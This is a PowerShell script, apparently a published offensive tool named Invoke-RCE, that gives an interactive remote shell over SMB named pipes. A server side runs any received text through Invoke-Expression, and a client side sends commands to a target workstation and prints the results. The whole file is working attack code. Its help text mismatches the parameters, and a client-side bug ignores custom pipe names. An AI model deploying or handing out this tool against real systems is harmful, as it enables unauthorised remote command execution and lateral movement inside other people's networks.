function Invoke-RCE {

	<#

	.SYNOPSIS
	Invoke-RCE Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-RCE

	.DESCRIPTION
	A script to gain an interactive shell (Remote-Command-Execution) over a target system
	
	.PARAMETER Client
	Specify the target domain (default: current domain)
	
	.PARAMETER Server
	Specify the Domain Controller (default: will try to enumerate the DC)
	
	.PARAMETER PipeName
	Specify the target domain
	
	.PARAMETER Target
	Do the same process using each of the user/computer accounts we successfully owned
	
	.EXAMPLE
	# Server
 	Invoke-RCE -Server
	Invoke-RCE -Server -PipeName Something

 	# Client
	Invoke-RCE -Client -Target "Workstation-01.ferrari.local"
 	Invoke-RCE -Client -Target "Workstation-01.ferrari.local" -PipeName Something
	
	#>

	param (
		[switch]$Client,
		[switch]$Server,
		[string]$PipeName,
		[string]$Target
	)
	
	#$ErrorActionPreference = "SilentlyContinue"
	#$WarningPreference = "SilentlyContinue"
	
	if($Server){
		if($PipeName){$pipe = $PipeName}
		else{$pipe = "MyUniquePipeName"}

		$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipe, 'InOut', 1, 'Byte', 'None', 1024, 1024, $null)

		$pipeServer.WaitForConnection()

		$sr = New-Object System.IO.StreamReader($pipeServer)
		$sw = New-Object System.IO.StreamWriter($pipeServer)

		while ($true) {
			$command = $sr.ReadLine()

			if ($command -eq "exit") {
				$sw.WriteLine("Exiting...")
				$sw.Flush()
				break
			} else {
				$result = Invoke-Expression $command

				if ($result -is [System.Array]) {
					foreach ($line in $result) {
						$sw.WriteLine($line)
					}
				} else {
					$sw.WriteLine($result)
				}

				$sw.WriteLine("###END###")  # Delimiter indicating end of command result
				$sw.Flush()
			}
		}

		$pipeServer.Disconnect()
		$sr.Close()
		$sw.Close()
	}
	
	elseif($Client){
		if($pipe){$pipe = $PipeName}
		else{$pipe = "MyUniquePipeName"}
		
		if($Target){$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Target", $pipe, 'InOut')}
		else{
			Write-Output "Please specify a target"
			break
		}
		
		$pipeClient.Connect()

		$sr = New-Object System.IO.StreamReader($pipeClient)
		$sw = New-Object System.IO.StreamWriter($pipeClient)

		$serverOutput = ""
		while ($true) {
			$userCommand = Read-Host "Enter Command"
			$sw.WriteLine($userCommand)
			$sw.Flush()

			if ($userCommand -eq "exit") {
				break
			}

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {  # Check for the delimiter
					Write-Output $serverOutput.Trim()  # Print the entire result at once
					break
				} else {
					$serverOutput += "$line`n"  # Accumulate the output until the delimiter is found
				}
			}
		}

		$sr.Close()
		$sw.Close()
	}

}
